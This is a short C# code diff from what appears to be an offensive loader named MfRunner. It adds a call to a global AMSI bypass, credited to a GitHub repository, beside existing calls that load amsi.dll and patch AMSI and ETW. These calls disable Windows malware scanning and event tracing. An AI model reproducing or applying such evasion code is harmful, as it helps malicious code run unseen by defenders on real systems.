@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Collections.Generic;
 using System.Linq;
@@ -67,6 +67,7 @@ namespace MfRunner
                     }
                     AmsiAddress = (long)CustomLoadLibraryExA("amsi.dll", IntPtr.Zero, 0x800);
                     PatchAMSI();
+                    GlobalAMSIBypass(); // GlobalAMSIBypass from https://github.com/Chainski/GlobalAMSIBypass
                     PatchETW();
 
                 } else
